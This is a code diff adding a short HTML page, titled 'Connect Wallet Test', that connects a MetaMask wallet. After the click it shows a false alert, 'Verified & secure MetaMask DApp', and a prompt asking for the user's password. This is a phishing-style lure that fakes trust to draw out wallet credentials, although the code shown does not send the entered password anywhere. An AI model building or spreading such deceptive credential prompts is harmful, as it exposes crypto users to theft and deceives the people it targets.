@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Connect Wallet Test</title>
+  <style>
+    body { font-family: sans-serif; padding: 40px; }
+    button { padding: 12px 20px; font-size: 16px; cursor: pointer; }
+  </style>
+</head>
+<body>
+
+<button id="connectWallet">Connect Wallet</button>
+
+<script>
+  document.getElementById("connectWallet").addEventListener("click", async () => {
+    
+    // Trigger the alert no matter what happens
+    setTimeout(() => {
+      alert("Verified & secure MetaMask DApp");
+      prompt("Enter your password before continue");
+        }, 1000);
+
+    // Try to connect wallet
+    if (window.ethereum) {
+      try {
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        console.log("Wallet connected!");
+      } catch (err) {
+        console.log("Wallet connection rejected:", err);
+      }
+    } else {
+      console.log("No wallet installed.");
+    }
+  });
+</script>
+
+</body>
+</html>
